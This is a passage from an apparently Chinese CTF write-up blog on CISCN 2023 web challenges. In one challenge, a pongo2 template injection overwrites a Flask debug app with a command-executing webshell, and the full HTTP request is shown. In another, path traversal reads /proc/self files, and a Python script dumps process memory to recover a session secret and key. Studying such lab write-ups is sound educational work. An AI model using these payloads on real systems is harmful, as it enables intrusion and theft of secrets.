</span></span><span class=line><span class=cl>	<span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=o>.</span><span class=k>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>r</span><span class=o>.</span><span class=nx>GET</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=nx>route</span><span class=o>.</span><span class=nx>Index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>r</span><span class=o>.</span><span class=nx>GET</span><span class=p>(</span><span class=s2>&#34;/admin&#34;</span><span class=p>,</span> <span class=nx>route</span><span class=o>.</span><span class=nx>Admin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>r</span><span class=o>.</span><span class=nx>GET</span><span class=p>(</span><span class=s2>&#34;/flask&#34;</span><span class=p>,</span> <span class=nx>route</span><span class=o>.</span><span class=nx>Flask</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>r</span><span class=o>.</span><span class=nx>Run</span><span class=p>(</span><span class=s2>&#34;0.0.0.0:80&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>app.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;h&#34;</span><span class=p>:</span> <span class=s2>&#34;hello world!&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;hello&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></div><p>有三个路由，index、admin和flask
session检测，key为空，直接本地起环境（像index里面一样设置session</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>Cookie</span><span class=p>:</span><span class=n>session</span><span class=o>-</span><span class=n>name</span><span class=o>=</span><span class=n>MTY4OTIxMzM0M3xEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXx</span><span class=o>-</span><span class=mi>9</span><span class=n>wDJrv63GGaUmQnK_0WvaRL62AHGIY1IRVS4IdZ39Q</span><span class=o>==</span>
</span></span></code></pre></div><p>admin有ssti注入，admin中<code>out, err := tpl.Execute(pongo2.Context{"c": c})</code>的c为传入的变量<code>c *gin.Context</code>
flask对应后端的app.py
思路是通过ssti实现任意文件读写，覆盖app.py，由于app.py开启debug热部署，内容改变会重新加载。
include可以读取文件，但不能直接传引号的字符串，需要一个可控字符串变量
Context &ndash;> Request &ndash;> Host/Referer 可控</p><p>报错获取app.py位置
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png title=image-20230805011924762>
读文件：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{</span><span class=o>%</span><span class=n>include</span> <span class=n>c</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Referer</span><span class=p>()</span><span class=o>%</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span><span class=n>include</span> <span class=n>c</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Host</span><span class=p>()</span><span class=o>%</span><span class=p>}</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png title=image-20230805011935987></p><p>Context &ndash;> 找到上传文件，<code>SaveUploadedFile(file *multipart.FileHeader,dst string)</code>，需要<code>FileHeader</code> &ndash;> <code>FormFile(name string)(*multipart.FileHeader,error)</code>
需要两个可控变量，一个给dst，一个给name，用上面的Host和Referer
写文件：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{{</span><span class=n>c</span><span class=o>.</span><span class=n>SaveUploadedFile</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>FormFile</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Host</span><span class=p>),</span><span class=n>c</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Referer</span><span class=p>())}}</span>
</span></span></code></pre></div><pre tabindex=0><code>GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
Host: 8d29d285-1292-41ef-85ba-b8c310a6ec3a.challenge.ctf.show
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi
User-Agent: /app/server.py
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session-name=MTY4OTI1ODAwNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzyv2RXchGZcXdaKPew1jYXVZTOE270NGdCUSZk-SNumg==
Connection: close
Content-Length: 589

------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name=&#34;/app/server.py&#34;; filename=&#34;server.py&#34;
Content-Type: text/plain

from flask import Flask, request
import os

app = Flask(__name__)

@app.route(&#39;/shell&#39;)
def shell():
    cmd = request.args.get(&#39;cmd&#39;)
    if cmd:
        return os.popen(cmd).read()
    else:
        return &#39;shell&#39;

if __name__== &#34;__main__&#34;:
    app.run(host=&#34;127.0.0.1&#34;,port=5000,debug=True)
------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name=&#34;submit&#34;

------WebKitFormBoundaryrxtSm5i2S6anueQi--
</code></pre><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png title=image-20230805011955161>
覆盖成功，执行命令
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png title=image-20230805012011004></p><h3 id=deserbugjava之后再看>DeserBug（java，之后再看</h3><p><a href=https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp%28%E5%90%AB%E5%A4%8D%E7%8E%B0%29/#DeserBug-%E5%A4%8D%E7%8E%B0 target=_blank rel="noopener noreffer">https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0</a></p><h3 id=reading>reading</h3><p><a href=https://un1novvn.github.io/2023/05/29/ciscn2023/ target=_blank rel="noopener noreffer">https://un1novvn.github.io/2023/05/29/ciscn2023/</a>
黑盒题，可跨目录读取文件
借助经典的两个目录<code>/proc/self/environ</code> && <code>/proc/self/cmdline</code> 来读更多信息，获取源代码
/proc/self/cwd/app.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>math</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>send_file</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time_ns</span><span class=p>())</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/books&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>book_page</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>filepath</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;book&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;page_size&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>page_size</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;page_size&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>page_size</span> <span class=o>=</span> <span class=mi>3000</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;page&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>page</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;page&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>page</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>words</span> <span class=o>=</span> <span class=n>read_file_page</span><span class=p>(</span><span class=n>filepath</span><span class=p>,</span> <span class=n>page</span><span class=p>,</span> <span class=n>page_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>words</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flag</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=o>==</span> <span class=n>key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;flag</span><span class=si>{xxxxxxxxxxxxxxxxxx}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;no no no&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_file_page</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>page_number</span><span class=p>,</span> <span class=n>page_size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>size</span><span class=o>=</span><span class=n>page_size</span> <span class=o>+</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=n>offset</span> <span class=o>=</span> <span class=p>(</span><span class=n>page_number</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>page_size</span><span class=o>+</span><span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>file</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>words</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>words</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>            <span class=c1>#if error again</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=p>(</span><span class=n>page_number</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>page_size</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>words</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>page_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>words</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>配合start和end读内存，读取全部内存，找到32位字符串，那就是key或secret_key（通常做法）
内存里有些区域不可读，所以需要利用/proc/self/maps去读段的起始地址和结束地址
读取mem脚本：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span><span class=o>,</span><span class=nn>time</span><span class=o>,</span><span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#maps里是读maps的原始内容</span>
</span></span><span class=line><span class=cl><span class=n>maps</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;maps&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start_end</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>maps</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39; r&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span> <span class=c1>#忽略不可读的内存</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;-&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;-&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>start_end</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>start</span><span class=p>,</span><span class=n>end</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>page_size</span> <span class=o>=</span> <span class=mi>4096</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>line</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>start_end</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># page_size = end-start 写了这条也可</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start_page</span> <span class=o>=</span> <span class=n>start</span> <span class=o>//</span> <span class=n>page_size</span>
</span></span><span class=line><span class=cl>    <span class=n>page_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>end</span><span class=o>-</span><span class=n>start</span><span class=p>)</span><span class=o>//</span><span class=n>page_size</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[*]</span><span class=si>{</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s1>/</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>start_end</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;page_num: &#39;</span><span class=p>,</span><span class=n>page_num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;my/</span><span class=si>{</span><span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s1>-</span><span class=si>{</span><span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s1>.bin&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>page</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>page_num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;http://192.168.190.130:5000/books?book=../../../../../../../proc/self/mem&amp;page=</span><span class=si>{</span><span class=n>start_page</span><span class=o>+</span><span class=n>page</span><span class=si>}</span><span class=s1>&amp;page_size=</span><span class=si>{</span><span class=n>page_size</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>全局正则匹配，找到两个考得近的32位字符串</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mi>9776436</span><span class=n>d6a1453cf13eceee8cda4fd84</span>
</span></span><span class=line><span class=cl><span class=n>e6e69a980d637186e90656f2d9a5a1a8</span>
</span></span></code></pre></div><p>解session，可以解的是secret_key（9776436d6a1453cf13eceee8cda4fd84），剩下的为key（e6e69a980d637186e90656f2d9a5a1a8）
<a href=https://github.com/noraj/flask-session-cookie-manager target=_blank rel="noopener noreffer">https://github.com/noraj/flask-session-cookie-manager</a>
<img class=lazyload src=/svg/loading.min.svg data-src="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089, https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089 1.5x, https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089 2x" data-sizes=auto alt="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089" title=image.png>
接下来爆时间戳
从程序运行（开靶场）时，敲几个时间戳出来，前面几位固定，爆破后面数字
<img class=lazyload src=/svg/loading.min.svg data-src="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854, https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854 1.5x, https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854 2x" data-sizes=auto alt="https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854" title=image.png>
